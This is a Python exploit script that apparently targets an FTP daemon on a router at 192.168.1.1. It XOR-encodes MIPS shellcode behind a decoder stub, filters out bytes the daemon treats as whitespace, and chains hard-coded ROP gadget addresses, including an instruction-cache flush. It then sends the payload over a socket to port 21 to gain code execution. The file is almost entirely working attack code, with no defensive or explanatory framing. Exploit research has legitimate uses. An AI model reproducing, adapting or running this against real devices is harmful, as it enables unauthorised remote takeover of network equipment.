#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Author: Martin Heistermann <spca@mheistermann.de>
# Date: 2016-05-28
# License: AGPL3

import socket
import struct

tbl = [
  0x00, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
  0x28, 0x28, 0x28, 0x28, 0x28, 0x20, 0x20, 0x20, 0x20, 0x20, 
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
  0x20, 0x20, 0x20, 0x88, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 
  0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x04, 
  0x04, 0x04, 0x04, 0x04, 0x04, 0x04, 0x04, 0x04, 0x04, 0x10, 
  0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x41, 0x41, 0x41, 0x41, 
  0x41, 0x41, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 
  0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 
  0x01, 0x01, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x42, 0x42, 
  0x42, 0x42, 0x42, 0x42, 0x02, 0x02, 0x02, 0x02, 0x02, 0x02, 
  0x02, 0x02, 0x02, 0x02, 0x02, 0x02, 0x02, 0x02, 0x02, 0x02, 
  0x02, 0x02, 0x02, 0x02, 0x10, 0x10, 0x10, 0x10, 0x20, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
forbidden = bytes( [0] + [i for i,c in enumerate(tbl[1:]) if c&8])
print("forbidden whitespaces are: {}".format(list(map(hex,forbidden))))

def check_forbidden(s, where):
    okay = True
    for ch in forbidden:
        if ch in s:
            idx = s.index(ch)
            print("forbidden char {:x} in {}: {} - {}".format(ch, where, repr(s[:idx]), repr(s[idx:])))
            okay = False
    if not okay:
        raise Exception("fix forbidden chars")

def load_shellcode(fn):
    with open(fn,'rb') as fp:
        shellcode = fp.read()
    if len(shellcode)%4 != 0:
        raise Exception("error loading {}, len(sc)={} -> %4 != 0".format(fn,len(shellcode)))
    while shellcode.endswith(struct.pack("<I",0)):
        shellcode = shellcode[:-4]
    while shellcode.endswith(struct.pack("<I", 0x00200825)):
        shellcode = shellcode[:-4]
    return shellcode

def build_shellcode():
    decoder = load_shellcode('decoder')
    realshellcode = load_shellcode('shellcode')

    check_forbidden(decoder, "decoder")
    key = 0xfe
    encoded = bytes((x^key) for x in realshellcode)
    check_forbidden(encoded, "encoded shellcode")

    shellcode = decoder + encoded
# 8 + : words before shellcode
# + 1 : we use -1($reg) for lw/sw
# -4  : loops ends when s3=s4, so go one lower
    START = 8 + len(decoder) + 1 
    print("use for START in decoder.S: 0x{:x}".format(START))
    return shellcode

def main():
# TODO: increase s1 to make space for shellcode in the beginning of s0
    bloop = 7
    s1 = (1<<32)//10+1 + bloop # multiplied by 20, mod 2**32, this should be small
                       # (1<<32)//20 starts with 0x1c, which ftpd parses as whitespace, duh
    #off = (s1*20) % (1<<32)+10+0xc
    #print(off)
    #pc = 0x80295d0c # jalr $s0 ; addiu $a2, $zero, 0x13 
    gadget_sb = 0x804928d0 # sb $v0, 0x2105($a1) ; sb $v1, 0x2106($a1) ; jr $ra ; addiu $v0, $zero, 1
            # write last byte of this address, e.g. d0 to first 2 bytes of endaddr

    gadget_jalr_v1 = 0x8004171c # jalr $v1 ; move $a0, $s0
    gadget_icache = 0x804d565c

    #a0 = s0
    num_rop = 3
    sc_len = 20 * (bloop-(num_rop-1))
    jmp_back = 0x10a5ffff # foo: jmp foo;
    assert sc_len/4 < 0xffff
    jmp_back -= sc_len//4 # jmp_back is directly after the shellcode, so to jump
                         # to the beginning, we subtract the number of instructions(!)

    shellcode = build_shellcode()
    print("used {}/{} sc bytes".format(len(shellcode),sc_len))
    assert len(shellcode) <= sc_len, "len(shellcode)={}, sc_len={}".format(len(shellcode), sc_len)
    shellcode = shellcode.ljust(sc_len,b"A")

    # we compare cur == end in the shellcode to abort, add 4 so we really write the last 4 bytes
    END = 8 + sc_len + 1 + 4
    print("use for   END in decoder.S: 0x{:x}".format(END))


    delay_slot = 0x384204d2
    reg_target = 0xb000132b # and following byte
    icache_len = 0x01010140
    assert icache_len %0x20 == 0 # endless loop otherwise
    s0 = (struct.pack("<II",0x41414141,s1) # 8 bytes before shellcode
            + shellcode
            #                      a1,                            pc   a3
            +struct.pack("<IIIII", jmp_back,   delay_slot,      gadget_jalr_v1, 0xdeadbeef,0x42424242)
            +struct.pack("<IIIII", icache_len, 0x47474747,      gadget_icache, 0xdeadbeef,0x42424242)
            +struct.pack("<III", reg_target-0x2105, 0x45454545, gadget_sb) # could add II: , 0x44444444,0x43434343)
            )

    check_forbidden(s0, "payload")


    cmd = (b"E "*17)
    print((4-len(cmd)%4)%4)
    cmd = cmd.rjust(len(cmd)+(4-len(cmd)%4)%4, b"K")
    print("len(cmd) = {}, cmd={}".format(len(cmd), cmd))
    payload = cmd + s0
    print("len(payload) = {}, payload={}".format(len(payload), payload))
    assert len(payload) < 200, "payload too big with len={}".format(len(payload)) # TODO: check binary for real limit
    s = socket.socket()
    s.connect(("192.168.1.1",21))
    print("sending..")
    s.send(payload)

if __name__ == "__main__":
    main()
